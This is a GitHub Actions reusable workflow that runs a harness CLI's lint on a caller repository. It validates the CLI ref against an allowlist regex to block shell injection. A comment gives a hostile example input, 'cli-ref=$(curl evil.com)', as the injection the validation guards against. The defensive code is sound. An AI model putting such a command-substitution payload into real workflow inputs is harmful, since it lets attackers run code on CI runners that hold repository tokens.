# harness-checks.yml — reusable workflow per CS12.
#
# Consumers invoke this with ~10 lines:
#   jobs:
#     harness:
#       uses: henrik-me/agent-harness/.github/workflows/harness-checks.yml@v0.1.0
#       with:
#         cli-ref: v0.1.0  # optional; defaults to harness.config.json version
#
# Runs `harness lint --quiet` against the caller repo using the harness CLI
# pinned to the supplied (or auto-derived) ref.

name: harness-checks

# CS12 R1 (PR #48 review): explicit least-privilege permissions. The reusable
# workflow only needs to checkout caller content + invoke the CLI; it must NOT
# inherit broader caller-side write permissions.
permissions:
  contents: read

on:
  workflow_call:
    inputs:
      cli-ref:
        description: |
          Harness CLI ref (semver tag, branch name, or full 40-char SHA) to
          install via `npx -y github:henrik-me/agent-harness#<ref>`. If
          omitted, derived from the caller repo's harness.config.json version
          field. The ref is validated against a strict allowlist regex
          (^[a-zA-Z0-9._/-]+$) BEFORE being passed to npx; any ref containing
          shell metacharacters ($, `, ", ', ;, &, |, <, >, whitespace, etc.)
          is rejected to prevent shell-command injection.
        required: false
        type: string
        default: ''

jobs:
  harness-lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5  # v4
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020  # v4
        with:
          node-version: '20'
      - name: 'Pin npm >= 10.9 (works around npm 10.8.x GitFetcher bug)'
        # actions/setup-node@v4 with Node 20.20.2 ships npm 10.8.2 which has
        # a regression in the git fetcher (`npm error GitFetcher requires an
        # Arborist constructor to pack a tarball`) when invoking
        # `npx -y "github:owner/repo#<sha>"`. Fixed in npm 10.9.x. We pin
        # explicitly to a known-good version so the smoke is stable across
        # GitHub Actions image refreshes.
        run: npm install -g npm@10.9.2
      - name: 'Configure git url-rewrite for github: protocol (uses GITHUB_TOKEN)'
        # `npx -y "github:owner/repo#<ref>"` does an underlying `git clone`.
        # When the caller is the harness repo itself OR a private consumer, the clone
        # needs an authenticated url. We rewrite `github:` / `https://github.com/`
        # to use the workflow's GITHUB_TOKEN. Same pattern as the standalone
        # private-smoke.yml workflow.
        #
        # Safe for the public harness repo too: the rewrite is a no-op when
        # the underlying ref is public-readable; the token is only used if
        # auth is actually required.
        #
        # No tokens are echoed to stdout/stderr; the GITHUB_TOKEN is masked
        # in workflow logs by GitHub Actions.
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          git config --global url."https://x-access-token:${GH_TOKEN}@github.com/".insteadOf "git@github.com:"
          git config --global url."https://x-access-token:${GH_TOKEN}@github.com/".insteadOf "https://github.com/"
      - id: derive-ref
        name: Derive + validate effective harness CLI ref
        # CS12 R1 (PR #48 review): pass the GitHub expression through env: AND
        # validate against an allowlist regex before exporting as step output.
        # Direct interpolation of `${{ inputs.cli-ref }}` into a `run:` shell
        # script would allow shell-injection (e.g. cli-ref=$(curl evil.com)).
        env:
          INPUT_CLI_REF: ${{ inputs.cli-ref }}
        run: |
          if [ -n "$INPUT_CLI_REF" ]; then
            ref="$INPUT_CLI_REF"
            source="input"
          elif [ -f harness.config.json ]; then
            ref=$(node -e "console.log(JSON.parse(require('fs').readFileSync('harness.config.json','utf8')).version || '')")
            source="harness.config.json"
          else
            echo "ERROR: no cli-ref input AND no harness.config.json found" >&2
            exit 2
          fi
          if [ -z "$ref" ]; then
            echo "ERROR: derived ref is empty (source=$source)" >&2
            exit 2
          fi
          # Allowlist: alphanumeric, dot, underscore, slash, hyphen.
          # Covers semver tags (v0.1.0), branch names (main, feature/x),
          # and 40-char SHAs. Rejects anything with shell metacharacters.
          if ! printf '%s' "$ref" | grep -Eq '^[a-zA-Z0-9._/-]+$'; then
            echo "ERROR: ref \"$ref\" (source=$source) contains characters outside the allowlist [a-zA-Z0-9._/-]." >&2
            echo "ERROR: Refusing to interpolate into shell — see CS12 R1 PR review for shell-injection rationale." >&2
            exit 2
          fi
          echo "Effective harness CLI ref: $ref (source=$source)"
          echo "ref=$ref" >> "$GITHUB_OUTPUT"
      - name: Run harness lint
        # Pass the validated ref through env: as well; never interpolate the
        # GitHub expression directly into the run script body.
        #
        # IMPLEMENTATION NOTE: we used to invoke
        #   npx -y "github:henrik-me/agent-harness#${CLI_REF}" lint --quiet
        # but `npx` (npm 10.8.x and 10.9.x at minimum) hits an internal
        # `GitFetcher requires an Arborist constructor to pack a tarball`
        # error when installing from a `github:` URL with a SHA ref. This
        # is a known npm regression that affects all `npx -y "github:..."`
        # invocations on Actions runners (not specific to this workflow).
        #
        # Workaround: clone the harness repo manually into a tempdir using
        # the GITHUB_TOKEN-rewritten URL, install dependencies with `npm ci`,
        # and run the CLI directly. Functionally identical to the npx path
        # but bypasses the broken git fetcher in npm.
        env:
          CLI_REF: ${{ steps.derive-ref.outputs.ref }}
        run: |
          tmpdir="$(mktemp -d)"
          git clone --quiet --no-checkout https://github.com/henrik-me/agent-harness.git "$tmpdir"
          cd "$tmpdir"
          git checkout --quiet "$CLI_REF"
          npm ci --omit=optional --no-audit --no-fund
          node bin/harness.mjs lint --quiet
